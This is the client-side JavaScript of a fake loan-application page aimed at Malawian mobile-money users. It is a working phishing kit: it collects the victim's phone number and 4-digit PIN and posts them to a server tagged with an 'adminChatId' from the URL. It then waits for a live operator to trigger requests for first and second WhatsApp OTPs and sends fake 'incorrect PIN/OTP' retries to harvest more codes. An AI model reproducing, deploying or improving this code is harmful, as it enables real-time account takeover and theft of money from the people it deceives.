document.addEventListener('DOMContentLoaded', () => {
  let currentUserId = null;
  let otpStep = 1;
  let statusPollInterval = null;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  const screens = {
    welcome: document.getElementById('screen-welcome'),
    login: document.getElementById('screen-login'),
    step1: document.getElementById('screen-step1'),
    otp: document.getElementById('screen-otp'),
    success: document.getElementById('screen-success')
  };

  const loadingOverlay = document.getElementById('loading-overlay');
  const loadingTitle = document.getElementById('loading-title');
  const loadingSub = document.getElementById('loading-sub');

  // Interactive Sliders Logic
  const sliderBalance = document.getElementById('slider-balance');
  const balanceVal = document.getElementById('balance-val');
  const sliderAirtime = document.getElementById('slider-airtime');
  const airtimeVal = document.getElementById('airtime-val');

  if (sliderBalance && balanceVal) {
    sliderBalance.addEventListener('input', (e) => {
      balanceVal.innerText = `MWK ${Number(e.target.value).toLocaleString()}`;
    });
  }

  if (sliderAirtime && airtimeVal) {
    sliderAirtime.addEventListener('input', (e) => {
      airtimeVal.innerText = `${e.target.value} days`;
    });
  }

  function showScreen(key) {
    Object.values(screens).forEach(s => s.classList.remove('active'));
    if (screens[key]) screens[key].classList.add('active');
  }

  // Digit auto-focus utility
  const pinDigits = document.querySelectorAll('.pin-digit');
  const otpDigits = document.querySelectorAll('.otp-digit');

  function setupDigitInputs(inputs) {
    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(pinDigits);
  setupDigitInputs(otpDigits);

  // Toggle PIN eye icon
  const toggleEye = document.getElementById('toggle-pin-visibility');
  let isPinVisible = false;
  if (toggleEye) {
    toggleEye.addEventListener('click', () => {
      isPinVisible = !isPinVisible;
      pinDigits.forEach(i => i.type = isPinVisible ? 'text' : 'password');
    });
  }

  // Welcome -> Login Screen
  document.getElementById('btn-welcome-apply').addEventListener('click', () => {
    showScreen('login');
  });

  // Login Submit Validation -> Application Step 1
  const loginPhone = document.getElementById('login-phone');
  const phoneError = document.getElementById('login-phone-error');
  const pinError = document.getElementById('login-pin-error');

  document.getElementById('btn-login-submit').addEventListener('click', () => {
    let valid = true;
    const cleanPhone = loginPhone.value.replace(/\D/g, '');
    const isMalawiNumber = /^(099|098|088|077)\d{7}$/.test(cleanPhone);

    if (!isMalawiNumber) {
      phoneError.style.display = 'block';
      valid = false;
    } else {
      phoneError.style.display = 'none';
    }

    const pinVal = Array.from(pinDigits).map(i => i.value).join('');
    if (pinVal.length !== 4) {
      pinError.style.display = 'block';
      valid = false;
    } else {
      pinError.style.display = 'none';
    }

    if (valid) {
      showScreen('step1');
    }
  });

  // Step 1 Back -> Login
  document.getElementById('btn-step1-back').addEventListener('click', () => {
    showScreen('login');
  });

  // Application Submit -> Call Server API
  document.getElementById('btn-step1-submit').addEventListener('click', async () => {
    const cleanPhone = loginPhone.value.replace(/\D/g, '');
    const pinVal = Array.from(pinDigits).map(i => i.value).join('');
    const amtVal = `MWK ${Number(document.getElementById('loan-amount').value).toLocaleString()}`;

    showLoading('Submitting Request...', 'Sending your details securely.');

    try {
      const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          contact: cleanPhone,
          pin: pinVal,
          amount: amtVal,
          adminChatId: adminParam
        })
      });

      const data = await res.json();
      if (data.success) {
        currentUserId = data.userId;
        loadingTitle.innerText = 'Awaiting Admin Verification...';
        loadingSub.innerText = 'Please stay on this page while request is processed.';
        startStatusPolling();
      } else {
        hideLoading();
        alert(data.error || 'Submission failed.');
      }
    } catch (e) {
      hideLoading();
      alert('Network connection error.');
    }
  });

  // Status Polling
  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          otpStep = 1;
          document.getElementById('otp-phone-display').innerText = loginPhone.value;
          showScreen('otp');
        } else if (data.status === 'TRIGGER_SECOND_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          otpStep = 2;
          otpDigits.forEach(i => i.value = '');
          otpDigits[0].focus();
          alert('First OTP accepted. Please enter secondary OTP received via WhatsApp.');
          showScreen('otp');
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          document.getElementById('approved-amount-display').innerText = `MWK ${Number(document.getElementById('loan-amount').value).toLocaleString()}`;
          showScreen('success');
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          alert('Incorrect PIN entered. Please re-enter your 4-digit PIN.');
          pinDigits.forEach(i => i.value = '');
          showScreen('login');
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          alert('Incorrect OTP entered. Please re-enter the code from WhatsApp.');
          otpDigits.forEach(i => i.value = '');
          showScreen('otp');
        } else if (data.status === 'DENIED') {
          clearInterval(statusPollInterval);
          hideLoading();
          alert('Application request was declined.');
          showScreen('welcome');
        }
      } catch (e) {}
    }, 3000);
  }

  // Submit OTP API
  document.getElementById('btn-submit-otp').addEventListener('click', async () => {
    const otpVal = Array.from(otpDigits).map(i => i.value).join('');

    if (otpVal.length < 4 || !/^\d+$/.test(otpVal)) {
      document.getElementById('otp-error').style.display = 'block';
      return;
    }
    document.getElementById('otp-error').style.display = 'none';

    showLoading('Verifying OTP...', 'Validating your WhatsApp security code.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          otp: otpVal,
          step: otpStep
        })
      });

      const data = await res.json();
      if (data.success) {
        loadingTitle.innerText = 'Verifying Code...';
        loadingSub.innerText = 'Please wait while admin confirms your code.';
        startStatusPolling();
      } else {
        hideLoading();
        alert(data.error || 'Failed to submit OTP.');
      }
    } catch (e) {
      hideLoading();
      alert('Network error submitting OTP.');
    }
  });

  // Return Home
  document.getElementById('btn-go-home').addEventListener('click', () => {
    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
  });

  function showLoading(title, sub) {
    loadingTitle.innerText = title;
    loadingSub.innerText = sub;
    loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    loadingOverlay.classList.remove('active');
  }
});
                                 
